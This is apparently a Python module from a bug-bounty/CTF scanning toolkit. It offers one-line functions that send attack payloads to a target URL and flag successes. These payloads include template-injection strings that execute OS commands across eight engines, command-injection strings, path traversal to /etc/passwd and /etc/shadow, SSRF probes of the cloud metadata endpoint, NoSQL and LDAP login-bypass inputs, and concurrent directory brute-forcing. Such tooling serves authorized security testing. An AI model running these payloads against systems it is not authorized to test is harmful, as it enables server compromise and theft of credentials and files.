"""Quick security test wrappers — one-liner functions for common vulnerability classes.

All functions accept an optional `scanner` parameter to reuse a SecurityScanner
across tests, preserving state and findings. If omitted, a fresh scanner is created.
"""

from __future__ import annotations

from typing import Any
from urllib.parse import urljoin, urlparse

from bugbounty_ctf.engine import ResponseDiff, SecurityScanner, derive_base_url
from bugbounty_ctf.wordlists import WordlistLoader


def _get_scanner(url: str, scanner: SecurityScanner | None = None) -> SecurityScanner:
    """Return the provided scanner or create one for the given URL's origin."""
    if scanner is not None:
        return scanner
    return SecurityScanner(derive_base_url(url))


def test_login_sqli(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a login form for SQL injection."""
    scanner = _get_scanner(url, scanner)
    baseline = scanner.get_baseline(
        "POST", url, data={username_field: "test", password_field: "test"}
    )

    payloads = {
        "single_quote": "'",
        "or_true": "' OR 1=1--",
        "or_true_alt": "' OR '1'='1",
        "admin_comment": "admin'--",
        "or_empty": "' OR ''='",
    }

    print(f"[*] Testing SQLi on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        test_data = {username_field: payload, password_field: "anything"}
        r = scanner._make_request("POST", url, data=test_data)

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


SSTI_ENGINE_PAYLOADS: dict[str, dict[str, str]] = {
    "jinja2": {
        "math_7x7": "{{7*7}}",
        "math_7x49": "{{7*49}}",
        "config": "{{config}}",
        "self": "{{self}}",
        "rce_test": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    },
    "twig": {
        "math_7x7": "{{7*7}}",
        "math_7x49": "{{7*49}}",
        "config": "{{app.request.server}}",
        "rce_test": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    },
    "freemarker": {
        "math_7x7": "${7*7}",
        "math_7x49": "${7*49}",
        "rce_test": '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
    },
    "velocity": {
        "math_7x7": "#set($x=7*7)$x",
        "math_7x49": "#set($x=7*49)$x",
        "rce_test": "#set($e=$class.forName('java.lang.Runtime'))",
    },
    "erb": {
        "math_7x7": "<%= 7*7 %>",
        "math_7x49": "<%= 7*49 %>",
        "rce_test": "<%= `id` %>",
    },
    "smarty": {
        "math_7x7": "{7*7}",
        "math_7x49": "{7*49}",
        "rce_test": "{system('id')}",
    },
    "mako": {
        "math_7x7": "${7*7}",
        "math_7x49": "${7*49}",
        "rce_test": "<%import os;x=os.popen('id').read()%>${x}",
    },
    "pebble": {
        "math_7x7": "{{7*7}}",
        "math_7x49": "{{7*49}}",
        "rce_test": "{%set cmd='id'%}",
    },
}


def test_ssti(
    url: str,
    method: str = "POST",
    param_name: str = "template",
    *,
    scanner: SecurityScanner | None = None,
    test_all_engines: bool = False,
) -> list[dict[str, Any]]:
    """Test an endpoint for Server-Side Template Injection.

    By default tests Jinja2 payloads. If test_all_engines=True, tests
    payloads for 8 template engines: Jinja2, Twig, Freemarker, Velocity,
    ERB, Smarty, Mako, Pebble.
    """
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})

    if test_all_engines:
        payloads: dict[str, str] = {}
        for engine, engine_payloads in SSTI_ENGINE_PAYLOADS.items():
            for name, value in engine_payloads.items():
                payloads[f"{engine}_{name}"] = value
    else:
        payloads = SSTI_ENGINE_PAYLOADS["jinja2"]

    print(f"[*] Testing SSTI on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            # SSTI confirmation: payload substring appears, but the math result
            # is in the response AND was NOT in the baseline.
            if "7*7" in payload and "49" in r.text and "49" not in baseline.text:
                print("    [!] SSTI CONFIRMED — 7*7 evaluated to 49!")
            if "7*49" in payload and "343" in r.text and "343" not in baseline.text:
                print("    [!] SSTI CONFIRMED — 7*49 evaluated to 343!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_command_injection(
    url: str,
    method: str = "GET",
    param_name: str = "input",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for command injection."""
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})

    payloads = {
        "semicolon_id": "; id",
        "pipe_id": "| id",
        "backtick_id": "`id`",
        "dollar_id": "$(id)",
        "whoami": "; whoami",
    }

    print(f"[*] Testing command injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "uid=" in r.text or "gid=" in r.text:
                print("    [!] COMMAND EXECUTION CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_path_traversal(
    url: str,
    method: str = "GET",
    param_name: str = "file",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for path traversal."""
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test.txt"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test.txt"})

    payloads = {
        "passwd_1": "../../../etc/passwd",
        "passwd_2": "../../../../../../etc/passwd",
        "shadow": "../../../../../../etc/shadow",
        "hosts": "../../../../../../etc/hosts",
    }

    print(f"[*] Testing path traversal on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "root:x:0:" in r.text:
                print("    [!] PATH TRAVERSAL CONFIRMED — /etc/passwd content found!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_nosqli(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a JSON login endpoint for NoSQL injection."""
    scanner = _get_scanner(url, scanner)
    baseline = scanner.get_baseline(
        "POST", url, json={username_field: "test", password_field: "test"}
    )

    payloads = {
        "ne_null_username": {username_field: {"$ne": None}, password_field: "x"},
        "ne_null_both": {username_field: {"$ne": None}, password_field: {"$ne": None}},
        "ne_empty": {username_field: {"$ne": ""}, password_field: {"$ne": ""}},
        "gt_empty": {username_field: {"$gt": ""}, password_field: {"$gt": ""}},
        "regex_all": {username_field: {"$regex": ".*"}, password_field: {"$regex": ".*"}},
    }

    print(f"[*] Testing NoSQL injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        r = scanner._make_request("POST", url, json=payload)

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "logged_in" in r.text or "success" in r.text.lower():
                print("    [!] AUTH BYPASS CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_ldap_injection(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a login endpoint for LDAP injection."""
    scanner = _get_scanner(url, scanner)
    baseline = scanner.get_baseline(
        "POST", url, data={username_field: "test", password_field: "test"}
    )

    payloads = {
        "wildcard_both": {username_field: "*", password_field: "*"},
        "wildcard_user": {username_field: "*", password_field: "x"},
        "or_true": {username_field: "*)(uid=*))(|(uid=*", password_field: "x"},
    }

    print(f"[*] Testing LDAP injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        r = scanner._make_request("POST", url, data=payload)

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "logged_in" in r.text or "success" in r.text.lower() or "uid" in r.text:
                print("    [!] LDAP INJECTION CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_ssrf(
    url: str,
    method: str = "POST",
    param_name: str = "url",
    *,
    scanner: SecurityScanner | None = None,
    url_suffix: str = "",
) -> list[dict[str, Any]]:
    """Test an endpoint for SSRF.

    Args:
        url: Target endpoint URL
        method: HTTP method
        param_name: Parameter name that accepts URLs
        scanner: Optional shared scanner
        url_suffix: Suffix appended to each payload URL (e.g. '#.yaml' for
                    targets that require specific file extensions)
    """
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "http://example.com"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "http://example.com"})

    payloads = {
        "localhost": "http://127.0.0.1",
        "localhost_alt": "http://localhost",
        "aws_metadata": "http://169.254.169.254/latest/meta-data/",
        "octal": "http://0177.0.0.1",
        "decimal": "http://2130706433",
        "hex": "http://0x7f000001",
        "short": "http://127.1",
        "zero": "http://0",
        "metadata_decimal": "http://2852039166/latest/meta-data/",
    }

    if url_suffix:
        payloads = {k: v + url_suffix for k, v in payloads.items()}

    print(f"[*] Testing SSRF on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "AccessKeyId" in r.text or "meta-data" in r.text:
                print("    [!] SSRF CONFIRMED — Internal service accessed!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_cors(
    url: str,
    *,
    scanner: SecurityScanner | None = None,
    evil_origin: str = "https://evil.example",
) -> list[dict[str, Any]]:
    """Test an endpoint for CORS misconfigurations.

    Sends a series of crafted ``Origin`` headers and inspects the
    ``Access-Control-Allow-Origin`` (ACAO) and ``Access-Control-Allow-Credentials``
    (ACAC) response headers. Flags the classic high-impact patterns:

    - ACAO reflects an arbitrary attacker origin (origin reflection)
    - ACAO is ``*`` while ACAC is ``true`` (credentialed wildcard — invalid but seen)
    - ACAO reflects an attacker origin together with ACAC ``true`` (full ATO surface)
    - ACAO trusts ``null`` (exploitable via sandboxed iframes/data URLs)
    - Naive prefix/suffix/substring trust of the target host

    Returns one result dict per tested origin that produced an ACAO reflection.
    """
    scanner = _get_scanner(url, scanner)
    host = urlparse(url).hostname or ""

    origins = {
        "arbitrary": evil_origin,
        "null": "null",
        "subdomain_prefix": f"https://{host}.evil.example",
        "suffix_match": f"https://evil{host}",
        "substring": f"https://{host}evil.example",
    }

    print(f"[*] Testing CORS on {url}")
    results: list[dict[str, Any]] = []

    for name, origin in origins.items():
        r = scanner._make_request("GET", url, headers={"Origin": origin})
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"

        reflected = acao == origin or (acao == "*" and acac)
        if not reflected:
            continue

        if acao == "*" and acac:
            severity, note = "high", "wildcard ACAO with credentials"
        elif acao == origin and acac:
            severity, note = "critical", "attacker origin reflected with credentials"
        elif acao == "null":
            severity, note = "medium", "null origin trusted"
        elif acao == origin:
            severity, note = "medium", "attacker origin reflected (no credentials)"
        else:
            severity, note = "low", "wildcard ACAO"

        print(f"[!] CORS {severity.upper()}: {name} → ACAO={acao!r} ACAC={acac} ({note})")
        finding = {
            "test": name,
            "origin": origin,
            "acao": acao,
            "acac": acac,
            "severity": severity,
            "note": note,
        }
        results.append(finding)
        scanner._record_finding(
            url, "GET", f"Origin: {origin}", ["cors_misconfig", note], [note], "cors"
        )

    if not results:
        print("[-] No CORS misconfiguration detected")
    return results


def discover_content(
    base_url: str,
    *,
    scanner: SecurityScanner | None = None,
    wordlist: list[str] | None = None,
    extensions: list[str] | None = None,
    limit: int = 0,
    workers: int = 16,
) -> list[dict[str, Any]]:
    """Brute-force content/paths against a target using a wordlist.

    Loads the bundled ``dirbrute`` wordlist by default (overridable via
    ``wordlist``) and requests each candidate path **concurrently** (a single
    sequential pass times out against remote targets). To avoid the
    PHP-dev-server false-positive trap (every path returns 200 with identical
    length), responses whose ``(status, length)`` pair matches a dominant
    baseline signature are filtered out.

    Args:
        base_url: Target origin (path component is ignored).
        scanner: Optional shared scanner.
        wordlist: Explicit candidate list; defaults to the bundled dirbrute list.
        extensions: Optional extensions to append to each word (e.g. ['php','bak']).
        limit: If > 0, cap the number of words tried (useful for quick passes).
        workers: Concurrent request workers (set 1 to force a sequential scan).
    """
    scanner = _get_scanner(base_url, scanner)
    origin = derive_base_url(base_url)

    words = wordlist if wordlist is not None else WordlistLoader().load("dirbrute")
    if limit > 0:
        words = words[:limit]

    candidates: list[str] = []
    for w in words:
        w = w.strip().lstrip("/")
        if not w:
            continue
        candidates.append(w)
        for ext in extensions or []:
            candidates.append(f"{w}.{ext.lstrip('.')}")

    print(f"[*] Content discovery on {origin} — {len(candidates)} candidates ({workers} workers)")

    def probe(path: str) -> dict[str, Any] | None:
        target = urljoin(origin + "/", path)
        r = scanner._make_request("GET", target)
        if r.status_code in (404, 0):
            return None
        return {
            "path": path,
            "url": target,
            "status": r.status_code,
            "length": len(r.text),
            "location": r.headers.get("Location", ""),
            "_sig": (r.status_code, len(r.text)),
        }

    raw: list[dict[str, Any]] = []
    if workers <= 1:
        raw = [item for path in candidates if (item := probe(path)) is not None]
    else:
        from concurrent.futures import ThreadPoolExecutor

        with ThreadPoolExecutor(max_workers=workers) as pool:
            raw = [item for item in pool.map(probe, candidates) if item is not None]

    signature_counts: dict[tuple[int, int], int] = {}
    for item in raw:
        signature_counts[item["_sig"]] = signature_counts.get(item["_sig"], 0) + 1

    # Drop the dominant signature when it swamps results — that is the
    # catch-all routing pattern, not real discovered content.
    dominant: tuple[int, int] | None = None
    if signature_counts:
        top_sig, top_count = max(signature_counts.items(), key=lambda kv: kv[1])
        if top_count > 10 and top_count > len(raw) * 0.5:
            dominant = top_sig

    results: list[dict[str, Any]] = []
    for item in raw:
        if dominant is not None and item["_sig"] == dominant:
            continue
        item.pop("_sig", None)
        results.append(item)
        print(f"[+] {item['status']}  {item['length']:>7}  /{item['path']}")

    if dominant is not None:
        print(f"[*] Filtered {len(raw) - len(results)} catch-all responses (sig={dominant})")
    print(f"[*] {len(results)} interesting paths found")
    return results


def test_open_redirect(
    url: str,
    *,
    scanner: SecurityScanner | None = None,
    params: list[str] | None = None,
    evil_host: str = "evil.example",
) -> list[dict[str, Any]]:
    """Test an endpoint for open redirect via redirect-style parameters.

    Sends a range of redirect payloads (absolute, scheme-relative, backslash and
    whitespace tricks, and a credential-prefix bypass) in each candidate
    parameter, with redirects disabled, and confirms the ``Location`` header
    actually points the browser at the attacker-controlled host.

    Args:
        url: Target endpoint.
        scanner: Optional shared scanner.
        params: Redirect parameter names to try; defaults to a common set.
        evil_host: Attacker host to look for in the resulting Location.
    """
    scanner = _get_scanner(url, scanner)
    redirect_params = params or [
        "next",
        "url",
        "redirect",
        "redirect_uri",
        "return",
        "returnTo",
        "dest",
        "destination",
        "continue",
        "r",
        "u",
    ]
    payloads = {
        "absolute": f"https://{evil_host}",
        "scheme_relative": f"//{evil_host}",
        "backslash": f"/\\{evil_host}",
        "whitespace": f"https:/{evil_host}",
        "at_bypass": f"https://expected.test@{evil_host}",
        "subdomain_bypass": f"https://{evil_host}/expected.test",
    }

    print(f"[*] Testing open redirect on {url}")
    results: list[dict[str, Any]] = []

    for param in redirect_params:
        for name, payload in payloads.items():
            r = scanner._make_request("GET", url, params={param: payload}, allow_redirects=False)
            if r.status_code not in (301, 302, 303, 307, 308):
                continue
            location = r.headers.get("Location", "")
            dest_host = urlparse(location).hostname or ""
            if dest_host == evil_host:
                print(f"[!] OPEN REDIRECT: {param}={payload!r} → {location}")
                finding = {
                    "param": param,
                    "payload_type": name,
                    "payload": payload,
                    "location": location,
                    "status": r.status_code,
                }
                results.append(finding)
                scanner._record_finding(
                    url, "GET", f"{param}={payload}", ["open_redirect"], [location], "open_redirect"
                )

    if not results:
        print("[-] No open redirect detected")
    return results


def map_surface(base_url: str, *, scanner: SecurityScanner | None = None) -> dict[str, Any]:
    """Map the attack surface of a target."""
    scanner = _get_scanner(base_url, scanner)
    surface = scanner.map_surface("/")

    print(f"[*] Attack Surface Map for {base_url}")
    print(f"[*] Status: {surface.get('status_code')}")
    print(f"[*] Technology: {', '.join(surface.get('tech_hints', []))}")
    print(f"\n[*] Forms found: {len(surface.get('forms', []))}")
    for i, form in enumerate(surface.get("forms", [])):
        print(f"  Form {i + 1}: {form['method']} {form['action']}")
        for inp in form["inputs"]:
            print(f"    - {inp['name']} (value: {inp['value']})")

    print(f"\n[*] Links found: {len(surface.get('links', []))}")
    for link in surface.get("links", [])[:20]:
        print(f"  - {link}")
    if len(surface.get("links", [])) > 20:
        print(f"  ... and {len(surface['links']) - 20} more")

    return surface
